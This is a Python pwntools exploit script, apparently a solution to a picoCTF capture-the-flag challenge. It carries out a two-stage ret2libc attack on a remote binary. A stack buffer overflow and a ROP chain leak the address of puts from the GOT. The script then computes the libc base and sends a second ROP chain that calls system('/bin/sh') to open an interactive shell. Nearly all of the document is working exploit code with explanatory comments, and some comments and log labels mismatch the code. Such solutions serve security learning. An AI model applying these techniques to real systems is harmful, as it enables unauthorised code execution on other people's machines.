from pwn import *

context.arch = "amd64"

# _________ALL THE FILES WE NEED__________

elf = ELF("./vuln")
rop_elf = ROP(elf)

libc = ELF("libc.so.6")
rop_libc = ROP(libc)

# ________________________________________


# ________CONNECTION WITH SERVER___________

host, port = "mercury.picoctf.net", 49464
p = remote(host, port)

# _________________________________________


# _______ADDRESSES NEED FOR FIRST PAYLOAD________________

padding = "A" * 136  # padding found by overflowing the RIP return address
# ROP gadget for popping RDI
pop_rdi = rop_elf.find_gadget(["pop rdi", "ret"]).address
# ROP gadget for popping RSI
pop_rsi = rop_elf.find_gadget(["pop rsi", "pop r15", "ret"]).address

# the address of the puts function in GOT table (in order to call it)
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]  # the address of the puts function in PLT table
# the address of the first instruction in main (to call it back again)
main = elf.sym["main"]
# the address of the main function(to call it back again to send the second payload)
do_stuff = elf.sym["do_stuff"]

# We can choose in the second payload to call back the do_stuff function instead of main function
# Because need only 2 payloads (else we would have called main because of the while(True)

# _______________________________________________________


# __________________SENDING PAYLOAD__________________________

# Craft the payload to leak address of setbuf in libc

print(p.recvline())  # recieves the line that asks for the input

payload = padding.encode()  # add the padding to overflow the buffer
payload += p64(pop_rdi)  # pop rdi
# address of puts in the GOT Table(it will be the first argument of put() function)
payload += p64(puts_got)
# address of puts in the PLT table (in order to call it)
payload += p64(puts_plt)
payload += p64(main)  # return to main  function to execute it again

p.sendline(payload)

print(p.recvline())

# ___________________________________________________________


# ______________ADDRESS NEEDED FOR THE SECOND PAYLOAD_______________

# leak = p.recvline().rstrip()                      #retrived the address of the puts leak
# puts_libc = u64(leak + (8-len(leak)) * "\x00")    #unpack the address in under a length of 8 bytes

# retrieve the address of the leaked buffer with a length of 8 bytes
leak = p.recv(6)+b'\x00\x00'
leak = u64(leak)                                   # unpack the address
log.info(f"the base adress of LIBC: {hex(leak)}")

# leak = pack.u64(p.recvline().strip().ljust(8, b"\x00"))     #in order to leak the address of the puts() function


offset = libc.symbols["puts"]
libc_base = leak - offset
log.info(f"the base address of LIBC: {hex(libc_base)}")


system = libc.symbols['system']
libc_system = libc_base + system
log.info(f"the address of system in LIBC: {hex(libc_system)}")


# strings -a -t x libc.so.6 | grep "/bin/sh"
binsh = 0x1b40fa
libc_binsh = libc_base + binsh
log.info(f"the address of the /bin/sh in LIBC: {hex(libc_binsh)}")


# __________________________________________________________________


# ___________________SENDING SECOND PAYLOAD________________________

#  Craft the payload to call system("/bin/sh")

payload = padding.encode()          # Pad the stack until the stored RIP
payload += p64(pop_rsi)             # pop rsi ; pop r15 ; ret
payload += p64(0)                   # pop r15 ; ret
payload += p64(0)                   # ret
payload += p64(pop_rdi)             # ROP gadget to pop the rdi
# This will be the first argument of system()
payload += p64(libc_binsh)
payload += p64(libc_system)         # Call system()


p.sendline(payload)

# _________________________________________________________________


p.interactive()
